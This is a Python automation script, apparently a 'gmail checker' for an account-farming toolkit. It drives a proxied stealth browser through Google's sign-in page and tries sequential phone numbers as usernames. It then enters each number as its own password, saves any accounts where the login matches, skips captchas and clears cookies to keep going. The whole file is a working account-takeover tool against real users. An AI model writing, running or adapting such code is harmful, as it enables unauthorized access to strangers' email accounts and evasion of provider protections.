# from pynput.mouse import Button, Controller
from turtle import back
from pynput.keyboard import Key, Controller
import time
import random
import shutil
import sys
from os import path
from pyvirtualdisplay import Display
from datetime import datetime
from ps_lib.firefox import firefoxBrowser
from ps_lib.browser import browser
from ps_lib.uc import ucbrowser
from ps_lib.accounts import accounts
from ps_lib.helper import helper
from ps_lib.ps_setup import table
from ps_lib.post import post
from ps_lib.captcha import capcha
from ps_lib.ps_str import ps_str
from ps_lib.imap import imap
from selenium.webdriver.common.keys import Keys
import os

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)
bundle_dir = path.abspath(path.dirname(__file__))
os.path.dirname(os.path.abspath(__file__))

keyboard = Controller()
# keyboard.type(str(258956856))


def main(account_data, postinfo, packages_id, body_mail):
    # work start time
    starttime = datetime.now().strftime("%H:%M:%S")

    print(datetime.now().strftime("%H:%M:%S"))
    # print(account_data)
    account_id = account_data['id']
    worker_acc = accounts()
    use_proxy = True

    # b = browser(account_id, pva=account_data)
    # b = firefoxBrowser(account_id, pva=account_data)
    b = ucbrowser(account_id, pva=account_data)

    time.sleep(1)
    if b.PROXY_PASS == False and b.use_proxy == True:
        b.exit()
        print('proxy condition not fulfilled')
        # worker_acc.ban_3(account_id, 5)
        time.sleep(10)
        return False

    try:
        loginurl = 'https://accounts.google.com/signin/v2/identifier'

        b.get_url(loginurl)
        # b.get_url('https://accounts.google.com/signup/v2/webcreateaccount?service=mail&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp')
    except:
        b.exit()
    # time.sleep(120)
    count = 0
    

    for no in range(int(account_data['extra']), int(account_data['extra'])+1000):
        time.sleep(1)

        # rejeted
        # https://accounts.google.com/signin/v2/deniedsigninrejected
        # login page
        loginurl = 'https://accounts.google.com/signin/v2/identifier'
        # password page
        # https://accounts.google.com/signin/v2/challenge/pwd
        count = count+1
        print(count)
        if count % 20 == 1:
            number = no
            if account_data['extra'][0:1]==0:
                number = '0'+str(no)
                
            worker_acc.update_account(data="0"+str(number), id=account_data['id'])
            b.get_url(loginurl)
        if 'signinrejecte' in b.current_url():

            b.get_url(loginurl)
        if 'myaccount' in b.current_url():
            b.driver.delete_all_cookies()
            

            b.get_url(loginurl)
        

        if 'challenge/pwd' in b.current_url():
            oldNumber = str(no-1)
            if account_data['extra'][0:1]==0:
                oldNumber = '0'+str(no-1)
            print(oldNumber)
            worker_acc.save_account(data=oldNumber, soft_token=account_data['password'])
            #<input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value="">
            password = b.visibil_element('xpath','//input[@name="Passwd"]',wait=120)

            mailpass = oldNumber
            password.clear()
            if account_data['extra'][0:1]:
                password.send_keys(0)
            password.send_keys(mailpass)

            passwordNext = b.visibil_element(
                'css', '[id="passwordNext"] [type="button"]')

            passwordNext.click()
            time.sleep(3)
            if b.visibil_element('xpath','//input[@name="Passwd"]',wait=10):
                # print('pssword not match')
                b.get_url(loginurl)
                continue
            else:
                print('pssword matched')
                if account_data['extra'][0:1]:
                    fullaccount= "pssword 0"+str(oldNumber)
                else:
                    fullaccount= str(oldNumber)
                    
                    
                
                
                worker_acc.save_account(
                    data=fullaccount, soft_token=account_data['password'])
                worker_acc.update_account(data="0"+str(oldNumber), id=account_data['id'])
                

        try:
            imgcapch = b.visibil_element('id', "captchaimg", wait=1)

            if imgcapch.get_attribute('src'):
                # print('imgcapch')

                b.get_url(loginurl)

                continue
        except:
            pass
            # print('except imgcapch')
            # time.sleep(60)
            # b.get_url(loginurl)
            # continue

        if 'identifier' in b.current_url():
            # print('identifier')

            # time.sleep(60)
            try:

                number = b.visibil_element('name', "identifier")
                number.clear()

                print(account_data['extra'][0:1])
                if account_data['extra'][0:1]:
                    number.send_keys(0)
                
                number.send_keys(no)
            except:
                b.get_url(loginurl)
                continue

        nextpage = b.visibil_element(
            'css', '#identifierNext button[type="button"]', wait=1)
        try:
            nextpage.click()
        except:
            continue

    b.ipinfo_save(software_name='gmail checker')

    b.exit()
    print('browser close')

    print('start :', starttime)
    print('end :', datetime.now().strftime("%H:%M:%S"))


setup = table()
setup.token_verify()
# setup.pop_verify()

#w = int(input('how much worker you need? '))
# packages_id = input('proxy info by a line : ')
packages_id = '317345'

# worker = w + 1
worker = 2
# ........................start worker....................
# open('active.txt', "w+")
utility = helper()
headers = {}
profile_ids = {}
acc = accounts()
# print(acc.get_proxy_list())
# exit()
post = post()
if sys.platform not in ['Windows', 'win32', 'cygwin']:
    display = Display(visible=0, size=(1024, 768))
    display.start()
# x = threading.Thread(target=smtp.reply_check, args=(1,), daemon=True)
# x.start()
while True:

    # subprocess.call(["sudo", "ifconfig", "ens33", "down"])
    # subprocess.call(["sudo", "ifconfig", "ens33", "hw",
    #                 "ether", "00:11:22:33:44:55"])
    # subprocess.call(["sudo", "ifconfig", "ens33", "up"])
    utility.network_check()
    if setup.token_off():
        print('software off now but reply checking runing')
        time.sleep(60)
        continue
    one_account = acc.get_account()

    postinfo = post.get_post()
    body_mail = None
    if one_account == None or postinfo == None:
        print('post or account not find for worker')
        time.sleep(60)
        continue
    print('account id : ', one_account['id'])

    if path.isdir('profiles/' + str(one_account['id'])) == True:
        shutil.rmtree('profiles/' + str(one_account['id']))

    print('main')
    main(one_account, post, packages_id, body_mail)
    time.sleep(1)
